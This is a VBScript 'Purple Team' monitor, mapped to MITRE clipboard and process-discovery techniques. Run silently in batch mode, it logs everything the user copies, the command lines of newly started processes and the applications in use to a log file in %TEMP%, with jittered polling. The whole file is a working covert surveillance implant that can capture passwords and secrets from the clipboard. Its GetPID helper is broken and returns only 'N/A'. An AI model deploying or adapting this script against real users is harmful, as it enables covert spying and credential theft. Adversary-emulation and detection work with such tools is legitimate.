' Purple Team - Process & Clipboard Monitor (Non-Hooking)
' MITRE: T1115 (Clipboard), T1057 (Process Discovery), T1010 (App Window Discovery)
'
' No hooks, no GetAsyncKeyState, no PowerShell
' Runs via wscript.exe (or cscript.exe)
'
' Captures:
'   - Clipboard changes (anything user copies)
'   - Active process tracking (what apps are running)
'   - New process creation events via WMI (what user launches)
'   - Command-line arguments of new processes
'
' Usage: wscript.exe //nologo //B monitor.vbs
'        (//B = batch mode, no UI popups)
'

Dim fso, oShell, oNet
Dim logPath, lastClip, lastProcs

Set fso    = CreateObject("Scripting.FileSystemObject")
Set oShell = CreateObject("WScript.Shell")
Set oNet   = CreateObject("WScript.Network")

logPath   = oShell.ExpandEnvironmentStrings("%TEMP%") & "\log.txt"
lastClip  = ""
lastProcs = ""

' Header
LogIt "[+] Monitor started | " & oNet.ComputerName & "\" & oNet.UserName & _
      " | PID:" & GetPID() & " | Log:" & logPath

' ── WMI process creation watcher (async, catches new processes) ──
Dim objWMI, colEvents
Set objWMI = GetObject("winmgmts:\\.\root\cimv2")

' Subscribe to process creation events
Dim eventQuery
eventQuery = "SELECT * FROM __InstanceCreationEvent WITHIN 3 " & _
             "WHERE TargetInstance ISA 'Win32_Process'"

Dim watcher
Set watcher = objWMI.ExecNotificationQuery(eventQuery)

' Main loop
Dim loopCount
loopCount = 0

Do While True
    On Error Resume Next

    ' ── Check for new process events (non-blocking, 100ms timeout) ──
    Dim evt
    Set evt = watcher.NextEvent(100)
    If Err.Number = 0 And Not evt Is Nothing Then
        Dim procName, procCmd, procPid, procUser
        procName = evt.TargetInstance.Name
        procCmd  = evt.TargetInstance.CommandLine
        procPid  = evt.TargetInstance.ProcessId

        ' Log interesting new processes
        Select Case LCase(procName)
            Case "cmd.exe", "powershell.exe", "pwsh.exe", "conhost.exe", _
                 "net.exe", "net1.exe", "ipconfig.exe", "whoami.exe", _
                 "tasklist.exe", "systeminfo.exe", "reg.exe", "sc.exe", _
                 "certutil.exe", "bitsadmin.exe", "mshta.exe", _
                 "rundll32.exe", "regsvr32.exe", "wmic.exe", _
                 "ssh.exe", "scp.exe", "ftp.exe", "curl.exe", _
                 "python.exe", "python3.exe", "ruby.exe", "perl.exe", _
                 "notepad.exe", "mstsc.exe"
                LogIt "[EXEC] " & procName & " (PID:" & procPid & ") " & Left(procCmd, 300)
            Case Else
                ' Skip noise
        End Select
    End If
    Err.Clear

    ' ── Clipboard monitoring (every loop, ~3s) ──
    Dim clipTxt
    clipTxt = GetClipboard()
    If Len(clipTxt) > 0 And clipTxt <> lastClip Then
        lastClip = clipTxt
        LogIt "[CLIP] " & Left(clipTxt, 500)
    End If

    ' ── Active window tracking (every ~9s) ──
    loopCount = loopCount + 1
    If loopCount Mod 3 = 0 Then
        Dim curProcs
        curProcs = GetUserProcs()
        If curProcs <> lastProcs Then
            lastProcs = curProcs
            LogIt "[APPS] " & curProcs
        End If
    End If

    On Error GoTo 0
    WScript.Sleep 2000 + Int(Rnd * 2000) ' Jittered 2-4s
Loop

' ─────────────────────────────────────────────────────────────────
'  Helper functions
' ─────────────────────────────────────────────────────────────────

Function GetClipboard()
    On Error Resume Next
    Dim hDoc
    Set hDoc = CreateObject("htmlfile")
    GetClipboard = hDoc.parentWindow.clipboardData.GetData("text")
    Set hDoc = Nothing
    If Err.Number <> 0 Then GetClipboard = ""
    On Error GoTo 0
End Function

Function GetUserProcs()
    On Error Resume Next
    Dim wmi, procs, p, pList, pn
    Set wmi = GetObject("winmgmts:\\.\root\cimv2")
    Set procs = wmi.ExecQuery("SELECT Name FROM Win32_Process WHERE SessionId > 0")
    pList = ""
    For Each p In procs
        pn = LCase(p.Name)
        If pn = "chrome.exe" Or pn = "msedge.exe" Or pn = "firefox.exe" Or _
           pn = "notepad.exe" Or pn = "cmd.exe" Or pn = "outlook.exe" Or _
           pn = "teams.exe" Or pn = "slack.exe" Or pn = "winword.exe" Or _
           pn = "excel.exe" Or pn = "code.exe" Or pn = "mstsc.exe" Or _
           pn = "powershell.exe" Or pn = "putty.exe" Or pn = "filezilla.exe" Then
            If InStr(pList, p.Name) = 0 Then pList = pList & p.Name & " "
        End If
    Next
    Set wmi = Nothing
    GetUserProcs = Trim(pList)
    On Error GoTo 0
End Function

Function GetPID()
    On Error Resume Next
    Dim tempFile, tempPath, result
    tempPath = oShell.ExpandEnvironmentStrings("%TEMP%") & "\~pt.tmp"
    oShell.Run "cmd /c echo %RANDOM% > """ & tempPath & """", 0, True
    GetPID = "N/A"
    On Error GoTo 0
End Function

Sub LogIt(msg)
    On Error Resume Next
    Dim f, ts
    ts = Year(Now) & "-" & Right("0" & Month(Now), 2) & "-" & Right("0" & Day(Now), 2) & _
         " " & Right("0" & Hour(Now), 2) & ":" & Right("0" & Minute(Now), 2) & ":" & _
         Right("0" & Second(Now), 2)
    Set f = fso.OpenTextFile(logPath, 8, True)
    f.WriteLine "[" & ts & "] " & msg
    f.Close
    Set f = Nothing
    On Error GoTo 0
End Sub
